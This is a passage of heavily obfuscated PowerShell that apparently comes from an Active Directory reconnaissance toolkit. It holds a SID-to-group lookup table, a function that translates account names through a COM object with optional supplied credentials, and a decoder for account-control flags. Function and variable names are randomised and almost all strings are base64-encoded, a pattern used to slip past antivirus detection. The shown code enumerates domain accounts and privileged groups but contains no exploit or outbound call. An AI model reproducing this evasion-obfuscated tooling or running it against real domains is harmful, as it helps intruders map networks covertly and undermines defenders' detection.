                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAIABTAGUAbABmAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAxAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAyAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZAAgAEMAbwBkAGUA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAzAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABVAHMAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA0AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABJAG4AdABlAHIAYQBjAHQAaQB2AGUAIABMAG8AZwBvAG4A'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA1AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA3AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA4AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAUwB5AHMAdABlAG0A'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA5AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAAwAC0AMAA=')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIABTAGUAcgB2AGkAYwBlAHMAIAA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEcAdQBlAHMAdABzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAbwB3AGUAcgAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAG8AdQBuAHQAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFMAZQByAHYAZQByACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBpAG4AdAAgAE8AcABlAHIAYQB0AG8AcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEIAYQBjAGsAdQBwACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBwAGwAaQBjAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBlAC0AVwBpAG4AZABvAHcAcwAgADIAMAAwADAAIABDAG8AbQBwAGEAdABpAGIAbABlACAAQQBjAGMAZQBzAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAE4AZQB0AHcAbwByAGsAIABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEkAbgBjAG8AbQBpAG4AZwAgAEYAbwByAGUAcwB0ACAAVAByAHUAcwB0ACAAQgB1AGkAbABkAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAE0AbwBuAGkAdABvAHIAIABVAHMAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAEwAbwBnACAAVQBzAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFcAaQBuAGQAbwB3AHMAIABBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACAAQQBjAGMAZQBzAHMAIABHAHIAbwB1AHAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAATABpAGMAZQBuAHMAZQAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAEMATwBNACAAVQBzAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADMA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEUAdgBlAG4AdAAgAEwAbwBnACAAUgBlAGEAZABlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAFMAZQByAHYAaQBjAGUAIABEAEMATwBNACAAQQBjAGMAZQBzAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAAUgBlAG0AbwB0AGUAIABBAGMAYwBlAHMAcwAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAARQBuAGQAcABvAGkAbgB0ACAAUwBlAHIAdgBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAATQBhAG4AYQBnAGUAbQBlAG4AdAAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEgAeQBwAGUAcgAtAFYAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA4ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    Default {
                        a4ad8c5db2444528bab99963038ffd7c -Identity ${0060f067032040ef8393c187e7a9dae3} @b36bf00903c14682a2e243a875596f28
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBTAEkARABdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgAFMASQBEACAAJwAkAHsAMAAwADYAMABmADAANgA3ADAAMwAyADAANAAwAGUAZgA4ADMAOQAzAGMAMQA4ADcAZQA3AGEAOQBkAGEAZQAzAH0AJwAgADoAIAAkAF8A')))
            }
        }
    }
}
function a4ad8c5db2444528bab99963038ffd7c {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        ${d6f8ca3d1c994c23b84c147c1aa4c2c9},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${0dbb84d458a14688808dcf7eb27c0251} = @{
            'DN'                =   1  
            'Canonical'         =   2  
            'NT4'               =   3  
            'Display'           =   4  
            'DomainSimple'      =   5  
            'EnterpriseSimple'  =   6  
            'GUID'              =   7  
            'Unknown'           =   8  
            'UPN'               =   9  
            'CanonicalEx'       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }
        function a9886005eb0e49a79f8392dfd1fe38b6([__ComObject] $Object, [String] $Method, ${cfb775114fbf492c8232c4eab44dc078}) {
            ${b01c344f140447efaf17619a650a69ed} = $Null
            ${b01c344f140447efaf17619a650a69ed} = $Object.GetType().InvokeMember($Method, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), $NULL, $Object, ${cfb775114fbf492c8232c4eab44dc078})
            Write-Output ${b01c344f140447efaf17619a650a69ed}
        }
        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, $NULL)
        }
        function e1041e64587c414bb4dda512ae0c7b5e([__ComObject] $Object, [String] $Property, ${cfb775114fbf492c8232c4eab44dc078}) {
            [Void] $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, ${cfb775114fbf492c8232c4eab44dc078})
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            ${bdd271300b8145ac93bbd60ff8344665} = 2
            ${aae22d6b95b34ff490ab8c0013d392f2} = $Server
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${bdd271300b8145ac93bbd60ff8344665} = 1
            ${aae22d6b95b34ff490ab8c0013d392f2} = $Domain
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${c06147394d254e1fb93fe89f3c7a3e09} = $Credential.GetNetworkCredential()
            ${bdd271300b8145ac93bbd60ff8344665} = 1
            ${aae22d6b95b34ff490ab8c0013d392f2} = ${c06147394d254e1fb93fe89f3c7a3e09}.Domain
        }
        else {
            ${bdd271300b8145ac93bbd60ff8344665} = 3
            ${aae22d6b95b34ff490ab8c0013d392f2} = $Null
        }
    }
    PROCESS {
        ForEach (${3fd00557f1a8455fb6cf4f360a22419c} in $Identity) {
            if (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAVAB5AHAAZQA=')))]) {
                if (${3fd00557f1a8455fb6cf4f360a22419c} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAEEALQBaAGEALQB6AF0AKwBcAFwAWwBBAC0AWgBhAC0AegAgAF0AKwA=')))) {
                    ${e69b25df4a77459c802c5197d9c512b8} = ${0dbb84d458a14688808dcf7eb27c0251}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))]
                }
                else {
                    ${e69b25df4a77459c802c5197d9c512b8} = ${0dbb84d458a14688808dcf7eb27c0251}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA')))]
                }
            }
            else {
                ${e69b25df4a77459c802c5197d9c512b8} = ${0dbb84d458a14688808dcf7eb27c0251}[${d6f8ca3d1c994c23b84c147c1aa4c2c9}]
            }
            ${ff3b47a7e68143f494cd158bb8e995b4} = New-Object -ComObject NameTranslate
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                try {
                    ${c06147394d254e1fb93fe89f3c7a3e09} = $Credential.GetNetworkCredential()
                    a9886005eb0e49a79f8392dfd1fe38b6 ${ff3b47a7e68143f494cd158bb8e995b4} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABFAHgA'))) (
                        ${bdd271300b8145ac93bbd60ff8344665},
                        ${aae22d6b95b34ff490ab8c0013d392f2},
                        ${c06147394d254e1fb93fe89f3c7a3e09}.UserName,
                        ${c06147394d254e1fb93fe89f3c7a3e09}.Domain,
                        ${c06147394d254e1fb93fe89f3c7a3e09}.Password
                    )
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0AQQBEAE4AYQBtAGUAXQAgAEUAcgByAG8AcgAgAGkAbgBpAHQAaQBhAGwAaQB6AGkAbgBnACAAdAByAGEAbgBzAGwAYQB0AGkAbwBuACAAZgBvAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIAB1AHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgADoAIAAkAF8A')))
                }
            }
            else {
                try {
                    $Null = a9886005eb0e49a79f8392dfd1fe38b6 ${ff3b47a7e68143f494cd158bb8e995b4} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (
                        ${bdd271300b8145ac93bbd60ff8344665},
                        ${aae22d6b95b34ff490ab8c0013d392f2}
                    )
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0AQQBEAE4AYQBtAGUAXQAgAEUAcgByAG8AcgAgAGkAbgBpAHQAaQBhAGwAaQB6AGkAbgBnACAAdAByAGEAbgBzAGwAYQB0AGkAbwBuACAAZgBvAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIAA6ACAAJABfAA==')))
                }
            }
            e1041e64587c414bb4dda512ae0c7b5e ${ff3b47a7e68143f494cd158bb8e995b4} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
            try {
                $Null = a9886005eb0e49a79f8392dfd1fe38b6 ${ff3b47a7e68143f494cd158bb8e995b4} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (8, ${3fd00557f1a8455fb6cf4f360a22419c})
                a9886005eb0e49a79f8392dfd1fe38b6 ${ff3b47a7e68143f494cd158bb8e995b4} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) (${e69b25df4a77459c802c5197d9c512b8})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '${3fd00557f1a8455fb6cf4f360a22419c}' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function ConvertFrom-UACValue {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        ${b3874b8ac7dd49169d7fc6f9142c78e3},
        [Switch]
        $ShowAll
    )
    BEGIN {
        ${f3da87b97db44eb8923ccc6069a659dd} = New-Object System.Collections.Specialized.OrderedDictionary
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBDAFIASQBQAFQA'))), 1)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMATwBVAE4AVABEAEkAUwBBAEIATABFAA=='))), 2)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQBEAEkAUgBfAFIARQBRAFUASQBSAEUARAA='))), 8)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEMASwBPAFUAVAA='))), 16)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBOAE8AVABSAEUAUQBEAA=='))), 32)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBDAEEATgBUAF8AQwBIAEEATgBHAEUA'))), 64)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA=='))), 128)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABFAE0AUABfAEQAVQBQAEwASQBDAEEAVABFAF8AQQBDAEMATwBVAE4AVAA='))), 256)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFIATQBBAEwAXwBBAEMAQwBPAFUATgBUAA=='))), 512)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQARQBSAEQATwBNAEEASQBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 2048)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBPAFIASwBTAFQAQQBUAEkATwBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 4096)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAFIAVgBFAFIAXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAA=='))), 8192)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA=='))), 65536)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBOAFMAXwBMAE8ARwBPAE4AXwBBAEMAQwBPAFUATgBUAA=='))), 131072)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEEAUgBUAEMAQQBSAEQAXwBSAEUAUQBVAEkAUgBFAEQA'))), 262144)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAEYATwBSAF8ARABFAEwARQBHAEEAVABJAE8ATgA='))), 524288)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwBEAEUATABFAEcAQQBUAEUARAA='))), 1048576)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAXwBEAEUAUwBfAEsARQBZAF8ATwBOAEwAWQA='))), 2097152)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAFIARQBRAF8AUABSAEUAQQBVAFQASAA='))), 4194304)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAE8AUgBEAF8ARQBYAFAASQBSAEUARAA='))), 8388608)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAFQATwBfAEEAVQBUAEgAXwBGAE8AUgBfAEQARQBMAEUARwBBAFQASQBPAE4A'))), 16777216)
        ${f3da87b97db44eb8923ccc6069a659dd}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFIAVABJAEEATABfAFMARQBDAFIARQBUAFMAXwBBAEMAQwBPAFUATgBUAA=='))), 67108864)
    }
    PROCESS {
        ${d59d81b5591045c689c0ec7783e3d7cb} = New-Object System.Collections.Specialized.OrderedDictionary
        if ($ShowAll) {
            ForEach (${f2105d7958054e66951a27fa8dd3e8bb} in ${f3da87b97db44eb8923ccc6069a659dd}.GetEnumerator()) {
                if ( (${b3874b8ac7dd49169d7fc6f9142c78e3} -band ${f2105d7958054e66951a27fa8dd3e8bb}.Value) -eq ${f2105d7958054e66951a27fa8dd3e8bb}.Value) {
                    ${d59d81b5591045c689c0ec7783e3d7cb}.Add(${f2105d7958054e66951a27fa8dd3e8bb}.Name, "$(${f2105d7958054e66951a27fa8dd3e8bb}.Value)+")
                }
                else {
                    ${d59d81b5591045c689c0ec7783e3d7cb}.Add(${f2105d7958054e66951a27fa8dd3e8bb}.Name, "$(${f2105d7958054e66951a27fa8dd3e8bb}.Value)")
                }
            }
        }
        else {
            ForEach (${f2105d7958054e66951a27fa8dd3e8bb} in ${f3da87b97db44eb8923ccc6069a659dd}.GetEnumerator()) {
                if ( (${b3874b8ac7dd49169d7fc6f9142c78e3} -band ${f2105d7958054e66951a27fa8dd3e8bb}.Value) -eq ${f2105d7958054e66951a27fa8dd3e8bb}.Value) {
                    ${d59d81b5591045c689c0ec7783e3d7cb}.Add(${f2105d7958054e66951a27fa8dd3e8bb}.Name, "$(${f2105d7958054e66951a27fa8dd3e8bb}.Value)")
                }
            }
        }
        ${d59d81b5591045c689c0ec7783e3d7cb}
    }
}
function a1fcecd3120940898e2774ec72768c1d {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
